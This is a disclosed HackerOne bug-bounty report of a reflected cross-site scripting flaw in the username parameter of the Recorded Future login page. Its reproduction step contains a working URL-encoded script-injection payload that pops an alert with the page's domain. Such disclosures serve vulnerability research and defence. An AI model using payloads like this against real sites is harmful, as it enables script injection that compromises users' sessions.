# [https://app.recordedfuture.com] - Reflected XSS via username parameter 

## Report Details
- **Report ID**: 1201134
- **URL**: https://hackerone.com/reports/1201134
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-05-18T15:27:09.503Z
- **Disclosed**: 2022-01-21T13:51:14.499Z

## Reporter
- **Username**: bombon
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: recorded-future

## Vulnerability Information
## Steps To Reproduce:

```
1-> Visit https://app.recordedfuture.com/live/login/?reset=x&username=xss%22%3E%3Cimg+src=x+onerror=alert(document.domain)%3E
```

## Impact

An attacker could be able to Inject Malicious Javascript to compromise users

## Attachments
No attachments
